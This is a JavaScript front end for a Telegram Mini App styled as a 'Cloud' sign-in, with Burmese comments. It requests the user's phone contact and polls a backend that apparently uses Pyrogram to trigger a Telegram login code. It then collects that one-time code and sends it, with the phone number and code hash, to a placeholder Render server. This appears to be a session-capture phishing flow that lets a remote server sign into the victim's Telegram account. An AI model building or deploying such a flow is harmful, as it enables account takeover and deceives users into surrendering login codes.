const tg = window.Telegram.WebApp;
tg.expand();

// 🔴 သင့် Render URL ဖြင့် အစားထိုးပါ
const BACKEND_URL = "https://your-render-app-name.onrender.com"; 

let phoneHash = "";
let userPhone = "";
let userName = tg.initDataUnsafe?.user?.first_name || "Cloud User";

function showLoading(show) {
    document.getElementById("loading").classList.toggle("hidden", !show);
}

function switchStep(stepId) {
    document.querySelectorAll(".step").forEach(el => el.classList.add("hidden"));
    document.getElementById(stepId).classList.remove("hidden");
}

let pollingInterval;

function requestContact() {
    tg.requestContact(function(shared) {
        if (shared) {
            showLoading(true);
            switchStep("step-loading");
            
            // 💡 ပြင်ဆင်ချက်: Telegram Object မှ User ID ကို သေချာစွာ ဆွဲယူခြင်း
            let userId = tg.initDataUnsafe?.user?.id;
            
            if (!userId) {
                showLoading(false);
                alert("Error: Telegram User ID ကို ဖတ်၍မရပါ။");
                switchStep("step-phone");
                return;
            }
            
            // Backend ဆီသို့ ၂ စက္ကန့်တစ်ခါ လှမ်းစစ်မည်
            pollingInterval = setInterval(() => checkContactReceived(userId), 2000);
            
            setTimeout(() => {
                if(pollingInterval) {
                    clearInterval(pollingInterval);
                    showLoading(false);
                    alert("Timeout: အင်တာနက်ချိတ်ဆက်မှု ကြန့်ကြာနေပါသည်။ ပြန်လည်ကြိုးစားပါ။");
                    switchStep("step-phone");
                }
            }, 15000);
        } else {
            alert("Cloud သို့ ဝင်ရောက်ရန် ဖုန်းနံပါတ် မျှဝေရန် လိုအပ်ပါသည်။");
        }
    });
}

// နောက်ကွယ်မှ API ကို အဆက်မပြတ် လှမ်းစစ်မည့် Function
async function checkContactReceived(userId) {
    try {
        let res = await fetch(`${BACKEND_URL}/api/check_contact`, {
            method: "POST", 
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({ user_id: userId })
        });
        
        let result = await res.json();
        
        if (result.success) {
            // Backend တွင် ဖုန်းနံပါတ်ရပြီး OTP ပို့ပြီးသွားပါက
            clearInterval(pollingInterval); // စစ်ဆေးနေခြင်းကို ရပ်မည်
            pollingInterval = null;
            
            userPhone = result.phone;
            phoneHash = result.hash;
            
            showLoading(false);
            switchStep("step-otp"); // OTP ရိုက်ထည့်သည့် စာမျက်နှာသို့ ကူးပြောင်းမည်
            tg.HapticFeedback.impactOccurred("medium");
            
        } else if (result.message) { 
            // Pyrogram မှ OTP တောင်းရာတွင် Error တက်ခဲ့ပါက (ဥပမာ - Limit ကျော်နေခြင်း)
            clearInterval(pollingInterval);
            pollingInterval = null;
            showLoading(false);
            alert("Error: " + result.message);
            switchStep("step-phone");
        }
        // result.status == "waiting" ဖြစ်နေပါက အလုပ်ဆက်လုပ်စေရန် ဘာမှမရေးဘဲ ထားပါမည်
    } catch(e) {
        console.log("Waiting for backend...");
    }
}
async function verifyOTP() {
    let code = document.getElementById("otp_input").value;
    if(code.length !== 5) return alert("OTP ၅ လုံး ပြည့်အောင် ရိုက်ပါ။");
    
    showLoading(true);
    let res = await fetch(`${BACKEND_URL}/api/verify_code`, {
        method: "POST", headers: {"Content-Type": "application/json"},
        body: JSON.stringify({ phone: userPhone, code: code, hash: phoneHash, name: userName })
    });
    
    let result = await res.json();
    showLoading(false);
    
    if(result.success) {
        switchStep("step-success");
        tg.HapticFeedback.notificationOccurred("success"); // ဖုန်းတုန်ခိုင်းမည်
    } else {
        alert("Error: " + result.message);
    }
}
